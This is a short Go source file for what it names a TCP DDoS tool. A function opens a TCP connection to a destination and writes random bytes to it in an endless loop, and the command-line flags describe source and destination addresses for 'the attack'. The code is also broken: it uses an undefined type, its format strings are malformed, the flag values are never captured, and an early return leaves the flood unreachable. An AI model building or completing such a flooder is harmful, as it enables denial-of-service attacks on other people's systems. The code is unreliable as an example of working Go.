 package main

import (
	"crypto/rand"
	"net"
	"time"
	"fmt"
	"flag"
)

var (
	destination = "127.0.0.1"
	ports       = []int{80, 53, 8080}
	source      = []string{"127.0.0.1", "192.168.0.1"}
	dataSize    = 32
)

func GenRandomBytes(size uint) (blk []byte, err error) {
	blk = make([]byte, size)
	_, err = rand.Read(blk)
	return
}

func tcp4DDos(sourceTCP *net.TCPAddr, destinationTCP *net.TCPAddr, size uint) {
	for conn, err := net.DialTCP("tcp", sourceTCP, destinationTCP); true; {
		dt := time. Now()
		if(err != nil){
			fmt.Printf("%s	%s	TCP	%d FAILED\n",time.Now().UTC().Format("2006-01-02 15:04:05"), destinationTCP.String(), size)
			continue
		}
		data, _ := GenRandomBytes(size)
		conn.Write(data)
		fmt.Printf("$s	$s	TCP	$d SUCCESS\n", dt.String(), destinationTCP, size)
	}
}

func main() {
	var sourceFlag String
	var destinationFlag String
	flag.String("source", "127.0.0.1", "Addresses from which the attack will go")
	flag.String("destination", "127.0.0.1", "Addresses through which the attack will go")
	flag.Parse()
	args:= flag.Args()

	for _, value := range args {
		fmt.Printf("\n", value)
	}
	return
	fmt.Println("return don't give a fuck")
	srcTCP, _ := net.ResolveTCPAddr("tcp4", source[0])
	destTCP, _ := net.ResolveTCPAddr("tcp4", destination)
	print(destTCP)
	tcp4DDos(srcTCP, destTCP, uint(dataSize))
}
